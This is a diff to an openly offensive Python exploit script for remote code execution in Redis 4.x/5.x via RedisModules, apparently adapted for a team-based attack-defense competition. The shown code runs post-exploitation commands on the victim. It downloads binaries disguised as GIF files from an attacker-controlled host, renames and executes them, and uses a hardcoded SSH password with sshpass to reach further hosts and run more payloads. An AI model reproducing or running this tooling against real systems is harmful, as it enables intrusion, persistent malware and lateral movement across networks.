@@ -159,16 +159,16 @@ def reverse(remote):
     print("[*] Check at {}:{}".format(addr, port))
 
 
-def autoexploit(remote):
+def autoexploit(remote, team):
     print("\033[92m[+]\033[0m AutoExploitation...")
     remote.shell_cmd("apt-get update -y")    
     remote.shell_cmd("apt-get install -y curl openssh-client sshpass")
     remote.shell_cmd("curl http://192.168.7.100:5000/gifs/coolcat.gif -o /bin/redis-service")
     remote.shell_cmd("chmod +x /bin/redis-service")
     remote.shell_cmd("/bin/redis-service")
-    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.100")
-    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.3 wget http://192.168.7.100:5000/gifs/coolcat2.gif -O redis")
-    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.3 chmod +x redis && ./redis")
+    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
+    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 wget http://192.168.{team}.100:5000/gifs/coolcat2.gif -O redis")
+    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 chmod +x redis && ./redis")
     print('Auto exploit done!')
     
 
@@ -203,7 +203,7 @@ def printback(remote):
     print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
 
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, team):
     # get expolit filename
     expfile = os.path.basename(filename)
     #start exploit
@@ -247,7 +247,7 @@ def runserver(rhost, rport, lhost, lport):
         #elif choice.startswith("e"):
         #    pass
 
-        autoexploit(remote)
+        autoexploit(remote, team)
         cleanup(remote, expfile)
 
         remote.close()
@@ -256,6 +256,7 @@ def runserver(rhost, rport, lhost, lport):
 
 def main():
     parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
+    parser.add_argument("-t", "--team", dest="team", type=int, help="Target team number", required=True)
     parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
     parser.add_argument("-p", "--rport", dest="rport", type=int,
                         help="target redis port, default 6379", default=6379)
@@ -278,7 +279,7 @@ def main():
         print("\033[1;31;m[-]\033[0m Where you module? ")
         exit(0)
     payload = open(filename, "rb").read()
-    runserver(options.rhost, options.rport, options.lhost, options.lport)
+    runserver(options.rhost, options.rport, options.lhost, options.lport, options.team)
 
 
 if __name__ == '__main__':
